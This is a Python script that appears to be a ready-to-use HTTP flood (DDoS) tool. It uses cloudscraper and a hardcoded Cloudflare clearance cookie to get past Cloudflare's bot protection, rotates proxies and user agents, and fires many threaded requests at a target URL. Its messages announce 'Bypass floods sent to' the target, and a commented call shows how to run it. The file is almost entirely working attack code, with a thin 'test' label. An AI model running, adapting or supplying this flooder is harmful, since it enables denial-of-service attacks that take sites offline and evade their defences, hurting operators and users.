import threading
import cloudscraper
import requests
import random
import time
import sys

class TimeoutException(Exception):
    pass

def timeout_handler():
    time.sleep(120)
    raise TimeoutException()

def send_req_bypass_v2(url, packet, proxies, user_agents):
    scraper = cloudscraper.create_scraper()

    for _ in range(packet):
        try:
            proxy = random.choice(proxies)
            user_agent = random.choice(user_agents)

            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1000',
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US',
                'cookie': 'cf_chl_prog=a10; cf_clearance=xuVhZTWgZ0BYcKXvHXIGQAv3Z8T7DDNd9DrHFR_lSLA-1630471884-0-150; __cf_bm=609978792c4038b93b043febcc6e1dd97eee7e6d-1630471886-1800-AQj3WqP0F55vppfZFRv6k7My+T9wzhj0SbzdUeIM5NBCg6CUUReyu3uvz7LAzDYYQWdj7Zqt4Byj/+l3rpZSIcSn07xLiMCq3sW6Qrdsuj61WhWlTJs/TlNUILByN4b35A=='
            }

            t = scraper.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
        except cloudscraper.exceptions.CloudflareChallengeError:
            pass
        except requests.exceptions.ConnectTimeout:
            pass
        except requests.exceptions.RequestException as e:
            pass

def run_threads_bypass_v2(url, packets, threads, proxies, user_agents):
    thread_list = []
    
    for _ in range(threads):
        thread = threading.Thread(target=send_req_bypass_v2, args=(url, packets, proxies, user_agents))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

def bypass_test_v2(url, packets, threads, proxies_file, user_agents_file):
    with open(proxies_file, 'r') as f:
        proxies = [line.strip() for line in f.readlines()]

    with open(user_agents_file, 'r') as f:
        user_agents = [line.strip() for line in f.readlines()]

    timeout_thread = threading.Thread(target=timeout_handler)
    timeout_thread.start()

    try:
        print("\nBypass floods sent to:")
        print(f"Url: {url}")
        print(f"Packets: {packets}")
        print(f"Threads: {threads}\n")
        
        run_threads_bypass_v2(url, packets, threads, proxies, user_agents)
    except TimeoutException:
        print("\nTimeout! 2 minutes have passed.")
        sys.exit(0)
    except KeyboardInterrupt:
        print("\nTest canceled by user with CTRL + C")
        sys.exit(0)

# bypass_test_v2("http://example.com", packets=50, threads=10, proxies_file='proxies.txt', user_agents_file='user_agents.txt')
